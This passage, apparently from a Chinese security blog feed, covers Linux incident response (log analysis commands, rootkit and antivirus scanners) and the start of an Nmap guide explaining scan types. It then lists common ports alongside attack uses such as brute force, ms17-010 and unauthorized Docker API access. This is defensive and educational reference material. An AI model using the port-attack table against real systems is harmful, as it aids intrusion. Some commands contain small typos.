<h3 id="6-二进制文件分析"><a href="#6-二进制文件分析" class="headerlink" title="6. 二进制文件分析"></a>6. 二进制文件分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) file: 确定文件类型</span><br><span class="line"></span><br><span class="line">(2) ldd: 打印共享对象依赖关系, 即查询可执行程序所依赖的库和所在路径</span><br><span class="line"></span><br><span class="line">(3) strings: 打印二进制文件中的可打印字符的字符串</span><br><span class="line"></span><br><span class="line">(4) readelf: 显示有关ELF文件的信息</span><br><span class="line"></span><br><span class="line">(5) hexdump: 以 ASCII、十进制、十六进制或八进制显示文件内容</span><br><span class="line"></span><br><span class="line">(6) objdump: 从对象文件中显示信息，读取二进制或可执行文件，并将汇编语言指令转储到屏幕上</span><br><span class="line"></span><br><span class="line">(7) nm: 列出对象文件中的符号，从二进制文件中识别变量和函数</span><br></pre></td></tr></table></figure>

<ul>
<li><p><a href="http://www.skyfree.org/linux/references/ELF_Format.pdf">http://www.skyfree.org/linux/references/ELF_Format.pdf</a></p>
</li>
<li><p><a href="https://github.com/radareorg/radare2">https://github.com/radareorg/radare2</a></p>
</li>
</ul>
<h2 id="0x05-日志分析"><a href="#0x05-日志分析" class="headerlink" title="0x05 日志分析"></a>0x05 日志分析</h2><h3 id="1-日志介绍"><a href="#1-日志介绍" class="headerlink" title="1. 日志介绍"></a>1. 日志介绍</h3><p>日志默认存放位置：<code>/var/log/</code></p>
<p>查看日志配置情况：<code>less /etc/rsyslog.conf</code></p>
<table>
<thead>
<tr>
<th>日志文件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;var&#x2F;log&#x2F;cron</td>
<td>系统定时任务相关的日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;secure</td>
<td>记录用户登录验证和授权的信息，涉及账号和密码的程序都会记录</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;auth.log</td>
<td>记录系统授权信息，如用户登录和权限机制等</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件，使用last命令来查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
<td>记录当前已经登录的用户信息，用w,who,users等命令来查询</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;dmesg</td>
<td>记录系统在开机时内核自检的信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;messages</td>
<td>记录系统启动后的信息和错误日志</td>
</tr>
</tbody></table>
<h3 id="2-登录分析"><a href="#2-登录分析" class="headerlink" title="2. 登录分析"></a>2. 登录分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 登录成功IP统计</span><br><span class="line"></span><br><span class="line">$ grep -i Accepted /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">(2) 查看登录成功的日期、用户名、IP</span><br><span class="line"></span><br><span class="line">$ grep &quot;Accepted&quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line">(3) 定位有多少IP在爆破主机的root帐号</span><br><span class="line"></span><br><span class="line">$ grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>

<h3 id="3-Web日志分析"><a href="#3-Web日志分析" class="headerlink" title="3. Web日志分析"></a>3. Web日志分析</h3><p><strong>Apache 日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) apache日志文件位置</span><br><span class="line">/var/log/httpd/access.log     # Red Hat/CentOS Apache访问日志位置</span><br><span class="line">/var/log/apache2/access.log   # Debian/Ubuntu Apache访问日志文件位置</span><br><span class="line"></span><br><span class="line">(2) 日志位置定位</span><br><span class="line"></span><br><span class="line">$ grep -i CustomLog /etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">$ locate access.log access_log | grep httpd</span><br><span class="line"></span><br><span class="line">$ locate access.log access_log | grep apache</span><br></pre></td></tr></table></figure>

<p><strong>Nginx 日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志定位</span><br><span class="line"></span><br><span class="line">$ yum install mlocate &amp;&amp; updatedb  #安装locate所在文件包并更新搜索数据库</span><br><span class="line"></span><br><span class="line">$ locate access.log | grep nginx   #定位nginx访问日志</span><br><span class="line"></span><br><span class="line">$ locate error.log | grep nginx    #定位nginx错误日志</span><br><span class="line"></span><br><span class="line">$ grep &#x27;access.log&#x27; `locate nginx.conf` #根据配置文件定位日志</span><br></pre></td></tr></table></figure>

<p><strong>日志分析技巧</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 列出当天访问次数最多的10个IP</span><br><span class="line"></span><br><span class="line">$ awk -F &#x27;-&#x27; &#x27;&#123;print $1&#125;&#x27; log_file | uniq -c | sort -rn | head -10</span><br><span class="line"></span><br><span class="line">(2) 查看当天有多少个IP访问</span><br><span class="line"></span><br><span class="line">$ awk &#x27;&#123;print $1&#125;&#x27; log_file | sort -u | wc -l</span><br><span class="line"></span><br><span class="line">(3) 查看每一个IP访问了多少个页面：</span><br><span class="line"></span><br><span class="line">$ awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class="line"></span><br><span class="line">(4) 将每个IP访问的页面数进行从小到大排序：</span><br><span class="line"></span><br><span class="line">$ awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class="line"></span><br><span class="line">(5) 查看某一个IP访问了哪些页面：</span><br><span class="line"></span><br><span class="line">$ grep ^1.1.1.1 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class="line"></span><br><span class="line">(6) 去掉搜索引擎统计当天的页面</span><br><span class="line"></span><br><span class="line">$ awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">(7) 查看2018年11月11日11时这一个小时内有多少IP访问</span><br><span class="line"></span><br><span class="line">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 11/Nov/2018:11 | awk &#x27;&#123;print $2&#125;&#x27;| sort -u | wc -l</span><br><span class="line"></span><br><span class="line">(8) IP 统计</span><br><span class="line"></span><br><span class="line">$ grep &#x27;11/Nov/2018&#x27; /tmp/myid.access.log | awk &#x27;&#123;print $1&#125;&#x27; | awk -F&#x27;.&#x27; &#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27; | sort | uniq -c | sort -r -n | head -n 10</span><br><span class="line"></span><br><span class="line">(9) 网段统计</span><br><span class="line"></span><br><span class="line">$ cat /www/logs/www/access.2018-11-11.log | awk &#x27;&#123;print $1&#125;&#x27; | awk -F&#x27;.&#x27; &#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27; | sort | uniq -c | sort -r -n | head -n 20</span><br><span class="line"></span><br><span class="line">(10) 统计浏览器</span><br><span class="line"></span><br><span class="line">$ cat /www/logs/example.com/access.2018-11-11.log | grep -v -E &#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27; | sort | uniq -c | sort -r -n | head -n 100 | more</span><br><span class="line"></span><br><span class="line">(11) URL访问量统计</span><br><span class="line"></span><br><span class="line">$ cat /www/logs/access.2018-11-11.log | awk &#x27;&#123;print $7&#125;&#x27; | egrep &#x27;\?|&amp;&#x27; | sort | uniq -c | sort -rn | more</span><br><span class="line"></span><br><span class="line">(12) 删除一个月前日志</span><br><span class="line"></span><br><span class="line">$ rm -f /www/logs/access.log.$(date -d &#x27;-1 month&#x27; +&#x27;%Y-%m&#x27;)*</span><br></pre></td></tr></table></figure>

<h2 id="0x06-工具总结"><a href="#0x06-工具总结" class="headerlink" title="0x06 工具总结"></a>0x06 工具总结</h2><h3 id="1-Busybox"><a href="#1-Busybox" class="headerlink" title="1. Busybox"></a>1. Busybox</h3><p><a href="https://busybox.net/"><strong>Busybox</strong></a> <em>静态编译，可检测劫持了动态链接库的隐藏病毒</em></p>
<p>安装运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox</span><br><span class="line"></span><br><span class="line">$ chmod +x busybox</span><br><span class="line"></span><br><span class="line">$ ./busybox commond</span><br></pre></td></tr></table></figure>
<h3 id="2-Rootkit查杀"><a href="#2-Rootkit查杀" class="headerlink" title="2. Rootkit查杀"></a>2. Rootkit查杀</h3><p><a href="http://www.chkrootkit.org/"><strong>chkrootkit</strong></a> <em>Linux下rootkit检测工具</em></p>
<p>下载运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxf chkrootkit.tar.gz</span><br><span class="line"></span><br><span class="line">$ cd chkrootkit-*</span><br><span class="line"></span><br><span class="line">$ make sense</span><br><span class="line"></span><br><span class="line">$ cd ..</span><br><span class="line"></span><br><span class="line">$ cp -r chkrootkit- /usr/local/chkrootkit</span><br><span class="line"></span><br><span class="line">$ rm -r chkrootkit-</span><br><span class="line"></span><br><span class="line">$ /usr/local/chkrootkit/chkrootkit</span><br></pre></td></tr></table></figure>

<p><a href="ttp://rkhunter.sourceforge.net"><strong>rkhunter</strong></a> <em>一款用于检测Liunx系统是否感染rootkit的工具</em></p>
<p>下载运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget https://jaist.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf rkhunter-1.4.6.tar.gz</span><br><span class="line"></span><br><span class="line">$ cd rkhunter-1.4.4</span><br><span class="line"></span><br><span class="line">$ ./install.sh --install</span><br></pre></td></tr></table></figure>

<p>rootkit检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ rkhunter –checkall #执行rootkit预定库，来检测本地系统文件</span><br><span class="line"></span><br><span class="line">$ rkhunter --checkall --skip-keypress  #--skip-keyperss参数来自动持续检测，一直到结束</span><br></pre></td></tr></table></figure>
<h3 id="3-病毒查杀"><a href="#3-病毒查杀" class="headerlink" title="3. 病毒查杀"></a>3. 病毒查杀</h3><p><a href="http://www.clamav.net/download.html"><strong>ClamAV</strong></a> <em>Linux平台上的开源反病毒引擎，病毒库较丰富，更新频率高</em></p>
<p>下载运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ yum install epel-release -y</span><br><span class="line"></span><br><span class="line">$ yum -y install clamav</span><br><span class="line"></span><br><span class="line">$ freshclam   # 更新病毒库</span><br><span class="line"></span><br><span class="line">$ clamscan -r /opt   # 扫描目录</span><br></pre></td></tr></table></figure>

<p>病毒库更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /var/lib/clamav</span><br><span class="line">$ wget http://database.clamav.net/main.cvd</span><br><span class="line">$ wget http://database.clamav.net/daily.cvd</span><br><span class="line">$ wget http://database.clamav.net/bytecode.cvd</span><br><span class="line"> </span><br><span class="line">$ chown clamav:clamav  *</span><br></pre></td></tr></table></figure>

<h3 id="4-威胁取证"><a href="#4-威胁取证" class="headerlink" title="4.  威胁取证"></a>4.  威胁取证</h3><ul>
<li><p>virustotal: <a href="https://www.virustotal.com/gui/home">https://www.virustotal.com/gui/home</a></p>
</li>
<li><p>threatbook: <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
</li>
<li><p>redqueen: <a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com/IntelHome.html</a></p>
</li>
</ul>
<h3 id="5-webshell查杀"><a href="#5-webshell查杀" class="headerlink" title="5. webshell查杀"></a>5. webshell查杀</h3><ul>
<li><p><a href="https://www.rfxn.com/projects/linux-malware-detect/">linux-malware-detect</a> <em>a malware scanner for Linux released</em></p>
</li>
<li><p><a href="http://shelldetector.com/">Web Shell Detector</a> <em>find and identify php&#x2F;cgi(perl)&#x2F;asp&#x2F;aspx shells</em></p>
</li>
<li><p><a href="https://scanner.baidu.com/#">WEBDIR+</a> <em>百度OpenRASP团队推出的一款WebShell检测引擎</em></p>
</li>
<li><p><a href="http://webshell.cdxy.me/">http://webshell.cdxy.me/</a> <em>Deep Learning model for PHP webshell detection</em></p>
</li>
<li><p><a href="https://www.shellpub.com/">https://www.shellpub.com/</a> <em>河马，专注webshell查杀研究</em></p>
</li>
<li><p><a href="http://edr.sangfor.com.cn/backdoor_detection.html">http://edr.sangfor.com.cn/backdoor_detection.html</a> <em>深信服Webshell检测工具</em></p>
</li>
</ul>
<h3 id="6-审计检查"><a href="#6-审计检查" class="headerlink" title="6. 审计检查"></a>6. 审计检查</h3><p><a href="https://github.com/CISOfy/lynis"><strong>Lynis</strong></a>：<em>用于UNIX系统的安全审计工具</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ lynis show commands  # 查看 Lynis 中所有可用的命令</span><br><span class="line"></span><br><span class="line">$ lynis audit system  # 审计系统的安全状况，返回一份详细的报告</span><br><span class="line">  Lynis 使用颜色编码使报告更容易解读</span><br><span class="line">  绿色：一切正常</span><br><span class="line">  黄色：跳过、未找到，可能有个建议</span><br><span class="line">  红色：你可能需要仔细看看这个</span><br></pre></td></tr></table></figure>

<h3 id="7-工具合集"><a href="#7-工具合集" class="headerlink" title="7. 工具合集"></a>7. 工具合集</h3><p><a href="https://www.rfxn.com/">R-FX NETWORKS</a> | <a href="https://github.com/meirwah/awesome-incident-response/blob/master/README_ch.md">Awesome-incident-response</a> | <a href="https://github.com/rshipp/awesome-malware-analysis">Awesome-malware-analysis</a></p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Incident Response</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap扫描指南</title>
    <url>/posts/46803/</url>
    <content><![CDATA[<center>Nmap扫描原理、脚本引擎介绍及实战指南...</center>

<span id="more"></span>

<h3 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h3><h4 id="1-端口状态"><a href="#1-端口状态" class="headerlink" title="1. 端口状态"></a>1. 端口状态</h4><p>以下为Nmap对端口状态的划分及说明</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>open(开放的)</td>
<td>应用程序正在该端口接收TCP连接或者UDP报文，有应用程序在监听这个端口，可以被访问</td>
</tr>
<tr>
<td>closed(关闭的)</td>
<td>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听</td>
</tr>
<tr>
<td>filtered(被过滤的)</td>
<td>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放</td>
</tr>
<tr>
<td>unfiltered(未被过滤的)</td>
<td>端口可访问，但Nmap无法准确判断端口是否开放，ACK扫描中出现</td>
</tr>
<tr>
<td>open&#x2F;filtered(开放或者被过滤的)</td>
<td>无法确定端口是开放还是被过滤的，如开放的端口不响应；UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类</td>
</tr>
<tr>
<td>closed&#x2F;filtered(关闭或者被过滤的)</td>
<td>用于Nmap不能确定端口是关闭的还是被过滤的，只可能出现在IPID Idle扫描中</td>
</tr>
</tbody></table>
<h4 id="2-扫描方式"><a href="#2-扫描方式" class="headerlink" title="2. 扫描方式"></a>2. 扫描方式</h4><p><strong>TPC报文表头</strong></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/tcp_head.png"></p>
<p><em>Refer:</em> <a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">wikipedia&#x2F;Transmission_Control_Protocol</a></p>
<h5 id="a-TCP-全连接扫描"><a href="#a-TCP-全连接扫描" class="headerlink" title="a. TCP 全连接扫描"></a>a. TCP 全连接扫描</h5><p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP Connect扫描又称为全连接扫描，客户端与服务器建立 TCP 连接要进行一次三次握手，如果进行了一次成功的三次握手，则说明端口开放</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端会发送一个带有SYN标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有SYN和ACK标识的数据包给客户端，随后客户端会发送带有ACK和RST标识的数据包给服务点，此时客户端与服务器建立了连接</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/1_open.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当客户端发送一个带有 SYN 标识和端口号的 TCP 数据包给服务器后，如果服务器端返回一个带 RST 标识的数据包，则说明端口处于关闭状态</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/1_closed.png"></p>
<h5 id="b-TCP-SYN扫描"><a href="#b-TCP-SYN扫描" class="headerlink" title="b. TCP SYN扫描"></a>b. TCP SYN扫描</h5><p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP SYN扫描又称半开式扫描，该过程不会和服务端建立完整的连接；SYN扫描是直接发RST，而TCP全连接扫描是发ACK和RST</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端会发送一个带有SYN标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有SYN和ACK标识的数据包给客户端，随后客户端会返回带有RST标识的数据包而不是返回一个带有ACK和RST标识的数据包</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_open.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果目标端口处于关闭状态，则服务端会返回一个RST标识的数据包</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_closed.png"></p>
<h5 id="c-TCP-ACK扫描"><a href="#c-TCP-ACK扫描" class="headerlink" title="c. TCP ACK扫描"></a>c. TCP ACK扫描</h5><p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACK扫描返回两种状态: unfiltered/filtered；当发送给对方一个含有 ACK 表示的TCP报文的时候，都返回含有RST标志的报文，使用TCP ACK扫描来确定端口是否开放或者关闭；但可以利用它来扫描防火墙的配置，来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">向服务端发送一个带有 ACK 标识的数据包，如果收到带有 RST 标识的响应，则说明服务端没有过滤，不存在状态防火墙</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_unfilteredpng.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">端口不响应，或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)；服务器REJECT掉数据包，客户端会有个ICMP包返回，如果是直接DROP掉，就会什么也不会返回</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_filtered.png"></p>
<h5 id="d-TCP-Null扫描"><a href="#d-TCP-Null扫描" class="headerlink" title="d. TCP Null扫描"></a>d. TCP Null扫描</h5><p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在空扫描中，客户端发出的 TCP 数据包仅仅只会包含端口号而不会有其他任何的标识信息。</span><br><span class="line"></span><br><span class="line">1）如果目标端口是开放的则不会回复任何信息</span><br><span class="line"></span><br><span class="line">2）如果服务器返回了一个 RST（或者RST+ACK) 数据包，则说明目标端口是关闭的</span><br><span class="line"></span><br><span class="line">3）如果返回 ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明端口被服务器过滤了</span><br></pre></td></tr></table></figure>

<h5 id="e-TCP-Window扫描"><a href="#e-TCP-Window扫描" class="headerlink" title="e. TCP Window扫描"></a>e. TCP Window扫描</h5><p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP 窗口扫描的流程同 ACK 扫描类似，同样是客户端向服务器发送一个带有 ACK 标识和端口号的 TCP 数据包，这种扫描能够用于发现目标服务器端口的状态。在 ACK 扫描中返回 RST 表明没有被过滤，但在窗口扫描中，当收到返回的 RST 数据包后，它会检查窗口大小的值</span><br><span class="line"></span><br><span class="line">1) 如果窗口大小的值是个非零值，则说明目标端口是开放的</span><br><span class="line"></span><br><span class="line">2) 如果返回的 RST 数据包中的窗口大小为0，则说明目标端口是关闭的</span><br></pre></td></tr></table></figure>

<h5 id="f-TCP-FIN扫描"><a href="#f-TCP-FIN扫描" class="headerlink" title="f. TCP FIN扫描"></a>f. TCP FIN扫描</h5><p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FIN 扫描会向服务器发送带有 FIN 标识和端口号的 TCP 数据包。</span><br><span class="line"></span><br><span class="line">1）如果没有服务器端回应则说明端口开放</span><br><span class="line"></span><br><span class="line">2）如果服务器返回一个 RST 数据包，则说明目标端口是关闭的</span><br><span class="line"></span><br><span class="line">3）如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 代码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定端口状态</span><br></pre></td></tr></table></figure>

<h5 id="g-TCP-Xmas扫描"><a href="#g-TCP-Xmas扫描" class="headerlink" title="g. TCP Xmas扫描"></a>g. TCP Xmas扫描</h5><p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在发送的数据包中设置PSH（PUSH推送，数据包立刻发送）,FIN（结束会话）,URG（紧急）标志位</span><br><span class="line"></span><br><span class="line">1）如果目标端口是开放的则不会回复任何信息</span><br><span class="line"></span><br><span class="line">2）如果目标端口关闭则会返回一个RST+ACK的数据包</span><br><span class="line"></span><br><span class="line">3）如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态</span><br></pre></td></tr></table></figure>

<h5 id="h-UDP扫描"><a href="#h-UDP扫描" class="headerlink" title="h. UDP扫描"></a>h. UDP扫描</h5><p><strong>TCP&#x2F;UDP 对比</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP 是面向连接的协议，而UDP则是无连接的协议。</span><br><span class="line"></span><br><span class="line">面向连接的协议会先在客户端和服务器之间建立通信信道，然后才会开始传输数据。如果客户端和服务器之间没有建立通信信道，则不会有任何产生任何通信数据。</span><br><span class="line"></span><br><span class="line">无连接的协议则不会事先建立客户端和服务器之间的通信信道，只要客户端到服务器存在可用信道，就会假设目标是可达的然后向对方发送数据</span><br></pre></td></tr></table></figure>

<p><strong>扫描原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端会向服务器发送一个带有端口号的 UDP 数据包</span><br><span class="line"></span><br><span class="line">1）如果服务器回复了 UDP 数据包，则目标端口是开放的</span><br><span class="line"></span><br><span class="line">2）如果服务器返回了一个 ICMP 目标不可达的错误和代码3，则意味着目标端口处于关闭状态</span><br><span class="line"></span><br><span class="line">3）如果服务器返回一个 ICMP 错误类型3且代码为1，2，9，10或13的数据包，则说明目标端口被服务器过滤了</span><br><span class="line"></span><br><span class="line">4）如果服务器没有任何相应客户端的 UDP 请求，则可以断定目标端口可能是开放或被过滤的，无法判断端口的最终状态</span><br></pre></td></tr></table></figure>

<h4 id="3-端口渗透"><a href="#3-端口渗透" class="headerlink" title="3. 端口渗透"></a>3. 端口渗透</h4><p>总计一些常用端口的渗透用途</p>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">服务</th>
<th align="center">渗透用途</th>
</tr>
</thead>
<tbody><tr>
<td align="center">21</td>
<td align="center">ftp&#x2F;tftp&#x2F;vsftpd文件传输协议</td>
<td align="center">爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td>
</tr>
<tr>
<td align="center">22</td>
<td align="center">ssh远程连接</td>
<td align="center">爆破&#x2F;OpenSSH漏洞</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">Telnet远程连接</td>
<td align="center">爆破&#x2F;嗅探</td>
</tr>
<tr>
<td align="center">25</td>
<td align="center">SMTP邮件服务</td>
<td align="center">邮件伪造</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">DNS域名解析系统</td>
<td align="center">DNS区域传输&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗; 利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td align="center">67&#x2F;68</td>
<td align="center">dhcp服务</td>
<td align="center">劫持&#x2F;欺骗</td>
</tr>
<tr>
<td align="center">69</td>
<td align="center">tftp(简单文件传输协议,无认证)</td>
<td align="center">尝试下载目标重要配置文件</td>
</tr>
<tr>
<td align="center">110</td>
<td align="center">pop3</td>
<td align="center">爆破&#x2F;嗅探</td>
</tr>
<tr>
<td align="center">137&#x2F;139</td>
<td align="center">Samba服务</td>
<td align="center">爆破&#x2F;未授权访问&#x2F;远程代码执行</td>
</tr>
<tr>
<td align="center">143</td>
<td align="center">Imap协议</td>
<td align="center">爆破</td>
</tr>
<tr>
<td align="center">161</td>
<td align="center">SNMP协议</td>
<td align="center">爆破&#x2F;搜集目标内网信息</td>
</tr>
<tr>
<td align="center">389</td>
<td align="center">Ldap目录访问协议</td>
<td align="center">注入&#x2F;未授权访问&#x2F;弱口令&#x2F;匿名访问</td>
</tr>
<tr>
<td align="center">445</td>
<td align="center">smb</td>
<td align="center">ms17-010&#x2F;端口溢出</td>
</tr>
<tr>
<td align="center">512&#x2F;513&#x2F;514</td>
<td align="center">Linux Rexec服务</td>
<td align="center">爆破&#x2F;Rlogin登陆</td>
</tr>
<tr>
<td align="center">873</td>
<td align="center">Rsync服务</td>
<td align="center">文件上传&#x2F;匿名访问</td>
</tr>
<tr>
<td align="center">1080</td>
<td align="center">socket</td>
<td align="center">爆破&#x2F;内网渗透</td>
</tr>
<tr>
<td align="center">1099</td>
<td align="center">JAVA RMI</td>
<td align="center">反序列化远程命令执行漏洞</td>
</tr>
<tr>
<td align="center">1194</td>
<td align="center">openvpn</td>
<td align="center">获取vpn账号,进内网</td>
</tr>
<tr>
<td align="center">1352</td>
<td align="center">Lotus domino邮件服务</td>
<td align="center">爆破&#x2F;弱口令&#x2F;信息泄漏</td>
</tr>
<tr>
<td align="center">1433</td>
<td align="center">mssql</td>
<td align="center">爆破&#x2F;注入攻击&#x2F;提权&#x2F;sa弱口令</td>
</tr>
<tr>
<td align="center">1500</td>
<td align="center">ispmanager主机控制面板</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">1521</td>
<td align="center">oracle</td>
<td align="center">注入攻击&#x2F;TNS爆破&#x2F;弹shell</td>
</tr>
<tr>
<td align="center">1723</td>
<td align="center">pptp</td>
<td align="center">爆破&#x2F;获取vpn账号,进内网</td>
</tr>
<tr>
<td align="center">2049</td>
<td align="center">Nfs服务</td>
<td align="center">配置不当</td>
</tr>
<tr>
<td align="center">2082,2083</td>
<td align="center">cpanel主机管理面板登录</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">2181</td>
<td align="center">zookeeper服务</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">2375</td>
<td align="center">docker remote api</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">2601,2604</td>
<td align="center">zebra路由</td>
<td align="center">默认密码zerbra</td>
</tr>
<tr>
<td align="center">3128</td>
<td align="center">squid代理服务</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">3306</td>
<td align="center">mysql</td>
<td align="center">爆破&#x2F;注入&#x2F;拒绝服务&#x2F;提取</td>
</tr>
<tr>
<td align="center">3389</td>
<td align="center">Rdp远程桌面连接</td>
<td align="center">爆破&#x2F;shift后门&#x2F;ms12-020</td>
</tr>
<tr>
<td align="center">3690</td>
<td align="center">svn服务</td>
<td align="center">svn泄露&#x2F;未授权访问</td>
</tr>
<tr>
<td align="center">4848</td>
<td align="center">GlassFish控制台</td>
<td align="center">爆破&#x2F;认证绕过</td>
</tr>
<tr>
<td align="center">5000</td>
<td align="center">sybase&#x2F;DB2数据库</td>
<td align="center">爆破&#x2F;注入</td>
</tr>
<tr>
<td align="center">5432</td>
<td align="center">postgresql</td>
<td align="center">爆破&#x2F;注入&#x2F;缓冲区溢出</td>
</tr>
<tr>
<td align="center">5632</td>
<td align="center">pcanywhere服务</td>
<td align="center">拒绝服务&#x2F;代码执行</td>
</tr>
<tr>
